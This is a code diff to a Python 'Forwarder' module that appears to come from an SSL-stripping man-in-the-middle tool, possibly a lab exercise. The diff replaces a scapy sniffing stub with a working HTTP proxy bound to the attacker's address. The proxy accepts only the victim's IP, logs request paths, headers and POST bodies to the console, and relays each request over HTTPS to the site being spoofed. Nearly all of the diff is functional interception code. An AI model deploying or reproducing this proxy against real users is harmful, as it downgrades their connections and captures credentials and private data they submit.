@@ -1,52 +1,94 @@
-from scapy.all import *
-from scapy.layers.inet import IP
 from logger import log_info, log_warning
-from scapy.layers.http import HTTPRequest, TCP, Raw
+import threading
+import http.client
+import http.server
+import socketserver
+import requests
+
+site_to_spoof = None
+ip_victim = None
+
+# Custom HTTP request handler that only allows requests from the victim.
+class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
+
+    def __init__(self, *args, **kwargs):
+        super().__init__(*args, **kwargs)
+
+    def do_GET(self):
+        # Get the client's IP address
+        client_ip = self.client_address[0]
+        
+        # Check if the client's IP address matches the allowed IP
+        if client_ip == ip_victim:
+            # Print request path and headers
+            print("Received GET request")
+            print("Path:", self.path)
+            print("Headers:", self.headers)
+
+            # Use requests to forward this request to site_to_spoof
+            response = requests.get("https://" + site_to_spoof + self.path)
+            
+            # Send the response back to the client
+            self.send_response(response.status_code)
+            self.end_headers()
+            self.wfile.write(response.content)
+        else:
+            # Send a 403 Forbidden response
+            self.send_response(403)
+            self.end_headers()
+            self.wfile.write(b'403 Forbidden: Access denied')
+
+    def do_POST(self):
+        # Get the client's IP address
+        client_ip = self.client_address[0]
+        
+        # Check if the client's IP address matches the allowed IP
+        if client_ip == ip_victim:
+            # Print request path and headers
+            print("Received POST request")
+            print("Path:", self.path)
+            print("Headers:", self.headers)
+
+            # Read the content length from the headers
+            content_length = int(self.headers['Content-Length'])
+            # Read the POST data
+            post_data = self.rfile.read(content_length)
+            print("Body:", post_data.decode('utf-8'))
+            
+            # Use requests to forward this request to site_to_spoof
+            response = requests.post("https://" + site_to_spoof + self.path, data=post_data)
+            
+            # Send the response back to the client
+            self.send_response(response.status_code)
+            self.end_headers()
+            self.wfile.write(response.content)
+        else:
+            # Send a 403 Forbidden response
+            self.send_response(403)
+            self.end_headers()
+            self.wfile.write(b'403 Forbidden: Access denied')
+
 
 class Forwarder:
-    def __init__(self, interface, ip_attacker, ip_victim, ip_to_spoof):
+    def __init__(self, interface, ip_attacker, ip_victim_, site_to_spoof_):
+        global ip_victim, site_to_spoof
         self.interface = interface
-        self.ip_victim = ip_victim
         self.ip_attacker = ip_attacker
-        self.ip_to_spoof = ip_to_spoof
+        ip_victim = ip_victim_
+        site_to_spoof = site_to_spoof_
 
-    def strip(self):
+    def _client_communication(self):
+        socketserver.TCPServer.allow_reuse_address = True
+        httpd = socketserver.TCPServer((self.ip_attacker, 80), CustomHTTPRequestHandler)
+        httpd.serve_forever()
+
+    def forward(self):
         log_info("Starting packet forwarding")
-        sniff(
-            filter="tcp and port 80",
-            prn=self._on_packet_to_server,
-            iface=self.interface,
-            count=0,
-        )
+
+        # Start listening for HTTP requests from the victim
+        log_info("Starting HTTP server")
+        client_thread = threading.Thread(target=self._client_communication)
+        client_thread.start()
+        client_thread.join()
+
         log_warning("Stopping packet forwarding")
-
-    def _on_packet_to_server(self, packet):
-        if not packet.haslayer(Raw):
-            log_warning("Ignoring packet without Raw layer")
-            return
-        
-        from_victim = (packet[IP].src == self.ip_victim and packet[IP].dst == self.ip_attacker)
-        from_server = (packet[IP].src == self.ip_to_spoof and packet[IP].dst == self.ip_attacker)
-
-        if from_victim:
-            log_info(
-                "Received HTTP request for {} from {} with content {}".format(
-                    packet[IP].dst, packet[IP].src, packet[Raw].load
-                )
-            )
-            # TODO: Forward the packet to the server
-            # 1. Extract data from packet
-            # 2. Create a new packet with the extracted data destined for ip_to_spoof
-            # 3. Send the new packet over HTTPS
-
-
-        elif from_server:
-            log_info(
-                "Received HTTP response for {} from {} with content {}".format(
-                    packet[IP].dst, packet[IP].src, packet[Raw].load
-                )
-            )
-            # TODO: Forward the packet to the victim
-            # 1. Extract data from packet (decrypt)
-            # 2. Create a new packet with the extracted data destined for ip_victim
-            # 3. Send the new packet over HTTP
